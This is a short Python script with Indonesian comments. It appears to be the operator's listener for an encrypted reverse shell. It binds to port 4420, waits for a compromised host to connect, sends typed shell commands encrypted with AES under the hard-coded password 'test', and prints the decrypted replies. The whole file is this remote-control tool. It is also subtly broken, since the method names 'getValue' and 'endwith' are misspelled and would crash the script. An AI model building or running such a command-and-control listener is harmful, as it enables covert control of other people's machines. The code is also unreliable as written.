import socket,os
import pyAesCrypt
import io

#konfigurasi
c = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
c.bind(('0.0.0.0', 4420))
c.listen(1)
s,a = c.accept()

#set buffer size dan password
bufferSize = 1024
password = 'test'

#Encrypt data
def encryptData(msg):
    pbdata = str.encode(msg)
    fIn = io.BytesIO(pbdata)
    fCiph = io.BytesIO()
    pyAesCrypt.encryptStream(fIn, fCiph, password, bufferSize)
    dataSend = fCiph.getvalue()
    return dataSend

# Decrypt data
def decryptData(msg):
    #inisialisasi Ciphertext
    fCiph = io.BytesIO()
    fDec = io.BytesIO()
    fCiph = io.BytesIO(msg)
    ctlen = len(fCiph.getvalue())
    fCiph.seek(0)
    pyAesCrypt.decryptStream(fCiph, fDec, password, bufferSize, ctlen)
    decrypted = str(fDec.getValue().decode())
    return decrypted

while True:
    data = s.recv(1024)
    if decryptData(data).endwith("EOFX") == True:
        nextcmd = input("[shell]: ")
        if nextcmd == 'quit':
            print('\nQuitting...')
            s.send(encryptData(nextcmd))
            break
        else:
            s.send(encryptData(nextcmd))
            
    else :
        print('\n' + decryptData(data))